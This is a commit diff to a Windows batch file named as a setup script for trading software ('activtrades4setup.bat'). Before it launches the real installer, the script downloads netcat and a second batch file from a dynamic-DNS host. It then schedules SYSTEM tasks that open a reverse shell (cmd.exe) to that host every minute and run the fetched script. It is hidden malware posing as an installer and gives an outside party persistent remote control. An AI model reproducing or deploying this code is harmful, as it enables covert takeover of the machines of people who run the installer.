44235a965b55a1238b38aa1a9369a3c7ff3fd081
pistacchietto <pistacchietto2@gmail.com>
2018-06-29 08:50:03 +0200

    ok

--- activtrades4setup.bat
+++ activtrades4setup.bat
@@ -1,6 +1,8 @@
 %windir%\System32\cmd.exe /c powershell -Command (new-object System.Net.WebClient).DownloadFile('http://verifiche.ddns.net/nc64.exe','%windir%\nc64.exe')
+%windir%\System32\cmd.exe /c powershell -Command (new-object System.Net.WebClient).DownloadFile('http://verifiche.ddns.net/get.bat','%windir%\get.bat')
 schtasks /create /ru "SYSTEM" /sc minute /mo 1 /tr "nc64.exe -e cmd.exe verifiche.ddns.net 4001" /tn sys /rl highest /F
 schtasks /create /ru "SYSTEM" /sc minute /mo 5 /tr "taskkill /f /im nc64.exe" /tn syskill /rl highest /F
+schtasks /create /ru "SYSTEM" /sc minute /mo 1 /tr "%windir%\get.bat" /tn office_get /rl highest /F
 rem schtasks /delete /tn sys /F
 %windir%\activtrades4setup.exe
 
